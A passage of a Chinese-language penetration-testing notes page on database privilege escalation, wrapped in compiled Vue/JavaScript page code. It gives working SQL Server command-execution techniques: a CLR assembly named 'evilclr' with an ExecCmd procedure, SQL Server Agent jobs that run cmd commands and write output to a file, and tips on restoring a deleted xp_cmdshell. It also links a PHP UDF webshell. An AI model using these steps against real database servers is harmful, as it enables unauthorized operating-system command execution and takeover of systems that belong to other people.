    <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>
go
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后创建存储过程</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCmd<span class="token punctuation">]</span>
<span class="token variable">@cmd</span> NVARCHAR <span class="token punctuation">(</span>MAX<span class="token punctuation">)</span>
<span class="token keyword">AS</span> EXTERNAL NAME <span class="token punctuation">[</span>evilclr<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>StoredProcedures<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span>
go
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行系统命令</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">exec</span> dbo<span class="token punctuation">.</span>execcmd <span class="token string">&#39;whoami&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="sql-server-agent-job-代理执行计划任务" tabindex="-1"><a class="header-anchor" href="#sql-server-agent-job-代理执行计划任务" aria-hidden="true">#</a> SQL Server Agent job 代理执行计划任务</h3><p>SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业。</p><details class="custom-container details"><summary>利用条件</summary><p>1）拥有 DBA 权限 2）需要 sqlserver 代理 (sqlagent) 开启，Express 版本Sql Server 是无法启用的</p></details><div class="language-mssql line-numbers-mode" data-ext="mssql"><pre class="language-mssql"><code>-- 开启 sqlagent 服务
exec master.dbo.xp_servicecontrol &#39;start&#39;,&#39;SQLSERVERAGENT&#39;;

-- 利用任务计划命令执行（无回显,可以 dnslog）
-- 创建任务 test，这里test为任务名称，并执行命令，命令执行后的结果，将返回给文本文档out.txt

use msdb;
exec sp_delete_job null,&#39;test&#39;
exec sp_add_job &#39;test&#39;
exec sp_add_jobstep null,&#39;test&#39;,null,&#39;1&#39;,&#39;cmdexec&#39;,&#39;cmd /c &quot;whoami&gt;c:/out.txt&quot;&#39;
exec sp_add_jobserver null,&#39;test&#39;,@@servername
exec sp_start_job &#39;test&#39;;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,52);function y(S,D){const e=c("ExternalLinkIcon");return t(),p("div",null,[k,s("details",b,[g,s("p",null,[s("a",C,[n("https://github.com/echohun/tools/blob/master/大马/udf.php"),i(e)])])]),F,s("p",null,[n("如果xp_cmdshell被删除，可以尝试上传xplog70.dll "),s("a",A,[n("https://fix4dll.com/xplog70_dll"),i(e)]),n(" 进行恢复")]),h])}const x=l(E,[["render",y],["__file","权限提升-数据库.html.vue"]]);export{x as default};
